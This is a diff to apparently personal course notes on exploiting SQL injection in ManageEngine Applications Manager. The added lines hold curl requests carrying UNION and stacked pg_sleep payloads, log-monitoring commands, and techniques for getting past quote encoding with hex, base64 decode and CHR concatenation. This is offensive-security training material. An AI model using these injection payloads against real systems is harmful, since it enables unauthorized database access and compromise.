@@ -83,6 +83,10 @@ C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_l
 ```
 Listing 7 - PostgreSQL log directory
 
+```
+powershell> dir | sort LastWriteTime | select -last 1
+powershell> Get-Content .\postgres_11.log -wait -tail 1 | Select-String -Pattern "select version"
+```
 
 Use pgAdmin query tool or
 
@@ -218,8 +222,9 @@ Note that the plus sign between select and pg_sleep will be interpreted as a spa
 Now that we have verified our ability to execute stacked queries along with time-based blind injection, we can continue our exploit development.
 
 ```
-curl -k -v https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END
-curl -k -v https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+1
+curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END'
+curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1+UNION+SELECT+1'
+curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
          
 ```
 Ex.
@@ -227,5 +232,115 @@ Ex.
 ```
 grep -r -P "^.*?query.*?select.*?where.*?(\+)+.*?" *
 
+curl -k -v 'https://manageengine:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;select+pg_sleep(10);'
 ```
+found issue with < and > and '
+
+```
+ERROR:  column "lt" does not exist at character 85
+[ 2024-03-28 21:49:00.781 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1 union select &lt
+```
+Single quote became &#39
+```
+select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
+```
+
+How Houdini Escapes
+
+postgres allows stacked query.
+
+Single quote in string
+```
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1' HTTP/1.1
+Host: manageengine:8443
+```
+Listing 19 - Sending an SQL Injection payload that contains a single quote
+
+Looking at the log file we see the following error:
+```
+[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
+[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
+[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
+```
+Listing 20 - The SQL error message in the log file
+
+As it turns out, special characters are HTML-encoded before they are sent to the database for further processing. This causes us a few headaches as it seems that we cannot use quoted string values in our queries.
+
+In case of myaql:
+
+```
+MariaDB [mysql]> select concat('1337',' h@x0r')
+    -> ;
++-------------------------+
+| concat('1337',' h@x0r') |
++-------------------------+
+| 1337 h@x0r              |
++-------------------------+
+1 row in set (0.00 sec)
+
+MariaDB [mysql]> select concat(0x31333337,0x206840783072)
+    -> ;
++-----------------------------------+
+| concat(0x31333337,0x206840783072) |
++-----------------------------------+
+| 1337 h@x0r                        |
++-----------------------------------+
+1 row in set (0.00 sec)
+```
+
+As shown in the listing above, the ASCII characters in their hexadecimal representation are automatically decoded by the MySQL engine.
+
+As an example, the listing below shows how to make use of the decode function in PostgreSQL to convert our "AWAE" base64 encoded string:
+
+```
+select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
+```
+Listing 22 - Using the decode function in PostgreSQL. Note: we still need quotes!
+
+1
+(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/functions-string.html ↩︎
+
+
+##### Using CHR and String Concatenation
+
+we can select individual characters using their code points2 (numbers that represent characters) and concatenate them together using the double pipe (||) operator.
+
+```
+amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
+?column?
+--------
+AWAE
+(1 row)
+```
+
+The problem is that character concatenation only works for basic queries such as SELECT, INSERT, DELETE, etc. It does not work for all SQL statements.
+
+````
+amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
+CREATE TABLE
+INSERT 0 1
+amdb=# SELECT * from AWAE;
+ offsec
+--------
+ AWAE
+(1 row)
+```
+
+CHR does not work for COPY function
+
+```
+CREATE TABLE AWAE (offsec text);
+INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
+COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
+ERROR:  syntax error at or near "CHR"
+LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
+                              ^
+
+********** Error **********
+```
+(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.1/static/functions-string.html ↩︎
+
+2
+(Wikipedia, 2020), https://en.wikipedia.org/wiki/Code_point ↩︎
+
 
